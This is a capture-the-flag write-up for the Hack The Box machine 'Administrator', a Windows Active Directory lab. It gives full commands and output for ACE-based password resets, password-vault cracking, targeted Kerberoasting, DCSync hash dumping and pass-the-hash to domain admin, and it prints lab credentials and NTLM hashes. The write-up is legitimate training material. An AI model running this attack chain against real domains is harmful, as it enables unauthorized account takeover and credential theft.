# Key Takeaways
- If you have access to a user account, BloodHound is your best friend. (user.txt)
- Be aware of potential clock skew errors when Kerberoasting via a remote machine. (root.txt)

# Overview
- Platform: Windows
- HTB Rating: Easy - Medium

### Vulnerabilities
- Poor password hygiene, leaving easily brute-forced passwords on some user accounts and the password vault key.
- Overly permissive AD ACEs that facilitated lateral movement between numerous accounts alongside domain takeover via DCSync.

### Strengths
- Usage of a password manager to generate long, complex passwords.
- FTP permissions given to select user accounts prevented initial access to the password vault.

# Solving user.txt
This box is started out with user credentials for the user Olivia, `Olivia:ichliebedich`. I still started things out with the usual nmap scans to see what services would be available on the machine.
```
└──╼ $sudo nmap -sS -v -p- 10.10.11.42
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
51417/tcp open  unknown
53768/tcp open  unknown
53773/tcp open  unknown
53780/tcp open  unknown
53785/tcp open  unknown
53798/tcp open  unknown
```

We find that there are a decent amount of open ports, which was initially a bit overwhelming to decide what to focus on first. Considering that we already had user credentials, I figured it would be best if we could just immediately get remote access. To that end, port 5985 was looking like a solid choice as it might be possible to log in via a tool such as `evil-winrm`. Sure enough, I ran the following command and was able to get access as Olivia.
```bash
evil-winrm -i 10.10.11.42 -u Olivia -p ichliebedich
```

Even though I now had access and could begin looking for privilege escalation vectors from this account, I didn't want to ignore the possible information I could receive from the other open ports.
FTP access with our current user failed.
```
└──╼ $ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:bored): Olivia
331 Password required
Password:
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp> exit
221 Goodbye.
```

DNS zone transfer failed.
```
└──╼ $dig axfr administrator.htb @10.10.11.42

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr administrator.htb @10.10.11.42
;; global options: +cmd
; Transfer failed.
```

SMB shares showed that we only had read access to the default DC shares.
```
└──╼ $netexec smb 10.10.11.42 -u Olivia -p ichliebedich --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

At this point, it felt like time to start looking for privilege escalation vectors while logged into the Olivia account. Initially, I ran through a lot of the standard checks— looking for services with interesting permissions, looking for custom software, checking user and group privileges, among other things. However, something I can take away from this box is that if you have access to run BloodHound in an AD environment, do it right away as it would have saved me some time here.

I eventually uploaded a legacy BloodHound executable via WinRM, and then executed it to collect AD information.
```
*Evil-WinRM* PS C:\Users\olivia\Documents> upload SharpHound_v1.exe

Info: Uploading ./SharpHound_v1.exe to C:\Users\olivia\Documents\SharpHound_v1.exe

Data: 1402880 bytes of 1402880 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\olivia\Documents> .\SharpHound_v1.exe -c All --zipfilename administrator

 57 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-12-22T04:36:34.8652644-08:00|INFORMATION|SharpHound Enumeration Completed at 4:36 AM on 12/22/2025! Happy Graphing!
```

I then transferred this zip file back to my local machine and began to analyze the results in BloodHound. I right away opened the node for Olivia. I noticed that she has a GenericAll ACE over the user Michael.
<img width="921" height="116" alt="image" src="https://github.com/user-attachments/assets/5fa57643-771a-4bf6-aefa-7fb93187d76a" />

GenericAll gives the user complete control over the targeted object. With this in mind, I used this access to change the password of the Michael user with the `net` command.
```
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael Noodles333
The command completed successfully.
```

Before attempting to log in as Michael, I first went back to BloodHound. I noticed that Michael has a ForceChangePassword ACE over the user Benjamin.
<img width="912" height="127" alt="image" src="https://github.com/user-attachments/assets/4ab9ae5a-c56e-4a72-9423-b9b04c129f7d" />

I attempted to use the `net` command as I did with Michael, however this failed. I instead used PowerView to set the password.
```
*Evil-WinRM* PS C:\Users\michael\Documents> upload PowerView.ps1

Info: Uploading ./PowerView.ps1 to C:\Users\michael\Documents\PowerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\michael\Documents> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\michael\Documents> $secPassword = ConvertTo-SecureString 'Noodles444' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $secPassword -Verbose
Verbose: [Set-DomainUserPassword] Attempting to set the password for user 'benjamin'
Verbose: [Set-DomainUserPassword] Password for user 'benjamin' successfully reset
```

Inspecting the Benjamin user in BloodHound, the only thing that really stood out was its membership to the Share Moderators group. Due to this membership, it seems like a worthwhile idea to enumerate any network shares from this account including FTP and SMB.
<img width="771" height="298" alt="image" src="https://github.com/user-attachments/assets/c2d34a2a-13cc-4525-bdc5-c75daab268ab" />

SMB shares with access as Benjamin didn't look any more interesting.
```
└──╼ $netexec smb 10.10.11.42 -u benjamin -p Noodles444 --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:Noodles444
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

FTP access does have an interesting `Backup.psafe3` file.
```
└──╼ $ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:bored): benjamin
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||55169|)
150 Opening ASCII mode data connection.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
```

I used `pwsafe2john` to pull the masterkey hash from the file, and the tried to crack it via John the Ripper. This cracked the password vault key and allowed us to gain access.
```
└──╼ $pwsafe2john Backup.psafe3 > Backup.hash

(testenv) ┌─[bored@parrot]─[~/boxes/Administrator]
└──╼ $john -w=/usr/share/wor└──╼ $john -w=/usr/share/wordlists/rockyou.txt Backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 SSE2 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)
```

I then installed "passwordsafe" and accessed the vault by selecting the Backup.psafe3 file and inputting the password.
```
└──╼ $sudo apt install passwordsafe
└──╼ $pwsafe
```

We are given three user's and their passwords.
<img width="500" height="353" alt="image" src="https://github.com/user-attachments/assets/cbf857d5-6b06-4132-a5d9-564deff085a7" />

I copied each password out and inspected the users in BloodHound. Based on the "Enabled: False" data in BloodHound, it appeared that the alexander@administrator.htb and emma@administrator.htb accounts were inactive. Since the only active account was emily@administrator.htb, I started by logging in to the machine via WinRM as Emily.
```
└──╼ $evil-winrm -i 10.10.11.42 -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb

Evil-WinRM shell v3.5
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\emily\Documents> whoami
administrator\emily
```

We do find the user.txt flag in Emily's Desktop directory.
<img width="440" height="51" alt="image" src="https://github.com/user-attachments/assets/0c1de127-65d3-4934-ac14-30a81f87ec02" />

# Solving root.txt

I then once again inspected this user in BloodHound, noting that Emily has outbound GenericWrite control over the Ethan user.
<img width="563" height="125" alt="image" src="https://github.com/user-attachments/assets/1c952aa2-5d2a-4d1a-a7de-cea6b147bf8e" />

While GenericWrite is not as permissive as the GenericAll privileges we had on the other user, it still enables some attacks. Since we can modify most attributes of the targeted object, it gives us access to change/add a Service Principal Name (SPN). SPNs are unique identifiers that Kerberos uses to map a service instance to a service account. This is significant because any user in the domain is able to request a TGS ticket for an account with an SPN setup, and the TGS-REP is encrypted with the service account's NTLM hash. This opens the ability for us to try to brute force the password.

I setup the SPN on the Ethan user with PowerView.
```
*Evil-WinRM* PS C:\Users\emily\Documents> Set-DomainObject -Identity Ethan -SET @{serviceprincipalname='fake/pentest'}
```

I then attempted to request the TGS ticket also using PowerView, however I ran into an error.
```
*Evil-WinRM* PS C:\Users\emily\Documents> Get-DomainSPNTicket administrator/Ethan | fl
Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'administrator/Ethan' from user 'UNKNOWN' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details."
```

Considering that I was running this directly from the Emily user account which _should_ have permission to request this, I wasn't sure what was going wrong. So I moved to attempting to request it from my Linux machine.
```
└──╼ $GetUserSPNs.py administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -dc-ip 10.10.11.42 -request-user ethan
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation
--------------------  -----  --------  --------------------------  ---------  ----------
fake/pentest          ethan            2024-10-12 16:52:14.117811  <never>

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This gave me a bit more information about the error, so I did a bit of research. It seems this error can happen when the time difference between the client requesting the ticket and the KDC is over a certain threshold. Noting prior that the DC was running an NTP server (UDP 123), I figured it may be possible to simply sync our time with the server.
```
└──╼ $sudo apt install ntpdate
└──╼ $sudo ntpdate 10.10.11.42
2025-12-22 22:35:12.38768 (-0500) +25167.270005 +/- 0.017183 10.10.11.42 s1 no-leap
CLOCK: time stepped by 25167.270005
```

I then attempted to request the ticket again. This was successful and gave us a hash that we can try to crack.
```
└──╼ $GetUserSPNs.py administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -dc-ip 10.10.11.42 -request-user ethan
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation
--------------------  -----  --------  --------------------------  ---------  ----------
fake/pentest          ethan            2024-10-12 16:52:14.117811  <never>

[-] CCache file is not found. Skipping...
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$fc99e7e6fd115c7a0735b779f3a90d73$9e6841bf014a8caf7759c9fa3fb45427d1a1bbecf34d2928ef29302d5fa47c6a<SNIP>
```

I copied this hash into a file named `ethan.tgs` and attempted to crack it with Hashcat.
```
└──╼ $hashcat -a 0 -m 13100 ethan.tgs /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$be22ae4ff0e720c7fcfbf4dcf1806588$8cc412dbbe2400e51c442bd8<SNIP>:limpbizkit
```

This was successful and gave us the password to Ethan's account; `limpbizkit`. I once again went back to BloodHound to inspect this user's privileges. This account is a huge find because it has DCSync permission over the Administrator.htb domain, giving us the ability to dump the NTLM hashes for every domain account.
<img width="820" height="328" alt="image" src="https://github.com/user-attachments/assets/2764920c-8da4-4d77-bf45-5d159c0ebee0" />

I used the `secretsdump.py` tool from my attacking machine to dump these hashes.
```
└──╼ $secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42 -just-dc-ntlm
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8b9a0b91e318f430743ccd8dcc33b9a5:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:9cabf6c728d0b77b2dbf4fa23036db96:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Cleaning up...
```

To now leverage this information to get access as the built-in Domain Administrator account, I attempted to pass the hash via the `psexec.py` utility. This was successful and allowed us to obtain the root.txt flag.
```
└──╼ $psexec.py administrator.htb/Administrator@10.10.11.42 -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.11.42.....
[*] Found writable share ADMIN$
[*] Uploading file qVuJtcgR.exe
[*] Opening SVCManager on 10.10.11.42.....
[*] Creating service kCpt on 10.10.11.42.....
[*] Starting service kCpt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop && type root.txt
330669796ea44510c14e33555565fb9b
```
